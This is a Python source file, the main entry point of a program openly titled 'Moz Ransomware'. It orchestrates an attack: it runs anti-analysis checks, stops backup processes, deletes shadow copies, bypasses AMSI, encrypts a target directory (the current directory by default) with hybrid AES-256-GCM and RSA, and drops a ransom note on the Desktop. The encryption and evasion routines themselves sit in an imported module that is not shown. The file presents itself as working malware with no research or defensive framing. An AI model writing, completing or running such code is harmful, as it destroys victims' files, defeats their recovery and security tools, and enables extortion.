"""
Moz Ransomware - Main Entry Point (Phase 4: Complete Integration)
Integrates C++ crypto + evasion modules with Python workflow.
"""

import os
import sys
import argparse
from pathlib import Path
from typing import Optional, List


# Add wrapper path to imports
sys.path.insert(0, str(Path(__file__).parent))

from moz_wrapper import MozRansomware, MozEvasion, MozCrypto


def run_ransomware(victim_id: str = None, target_dir: str = None):
    """Execute full ransomware workflow."""
    
    print("=" * 60)
    print("     MOZ RANSOMWARE - HYBRID ENCRYPTION (AES-256-GCM + RSA)")
    print("=" * 60)
    print(f"Version: 2.0.0")
    print()
    
    # Initialize components
    moz = MozRansomware()
    evasion = MozEvasion()
    
    print("[INIT] Initializing core modules...")
    print(f"  - Crypto engine: loaded (native={moz.crypto._use_native})")
    print(f"  - Evasion module: loaded (lib={evasion._lib is not None})")
    print()
    
    # Run evasion checks before encryption
    print("[EVASION] Running anti-analysis checks...")
    summary = evasion.get_summary()
    for key, val in summary.items():
        status = "DETECTED" if val else "CLEAN"
        print(f"  - {key}: {status}")
    
    print()
    
    # Apply evasion techniques
    print("[EVASION] Applying evasion techniques...")
    evasion.stop_backup_processes()
    evasion.delete_shadow_copies()
    evasion.bypass_amsi()
    print("  - Backup processes: stopped")
    print("  - Shadow copies: deleted")
    print("  - AMSI bypass: applied")
    print()
    
    # Encrypt target directory
    if target_dir:
        print(f"[ENCRYPT] Target directory: {target_dir}")
        results = moz.encrypt_directory(target_dir)
        
        print("\n[RESULT] Encryption complete:")
        print(f"  - Total files scanned: {results['total_files']}")
        print(f"  - Files encrypted: {results['encrypted_files']}")
        print(f"  - Files skipped: {results['skipped_files']}")
        if results['failed_files'] > 0:
            print(f"  - Failed files: {results['failed_files']}")
    else:
        print("[ENCRYPT] No target directory specified")
    
    # Generate and save ransom note
    print()
    print("[RANSOM] Generating ransom note...")
    ransom_note = moz.generate_ransom_note(victim_id or "MOZ_VICTIM_001")
    
    desktop_path = Path.home() / "Desktop"
    if not desktop_path.exists():
        desktop_path.mkdir(parents=True, exist_ok=True)
    
    note_path = desktop_path / f"!!!READ_ME!!!.txt"
    with open(note_path, 'w') as f:
        f.write(ransom_note)
    
    print(f"  - Ransom note saved to: {note_path}")
    print()
    
    return results


def main():
    parser = argparse.ArgumentParser(
        description="Moz Hybrid Crypto Ransomware (Phase 4 Complete)"
    )
    parser.add_argument(
        "--victim-id", "-v",
        help="Unique victim ID for ransom note"
    )
    parser.add_argument(
        "--target", "-t",
        help="Target directory to encrypt"
    )
    
    args = parser.parse_args()
    
    # Default target is current directory
    target_dir = args.target or "."
    
    run_ransomware(args.victim_id, target_dir)


if __name__ == "__main__":
    main()
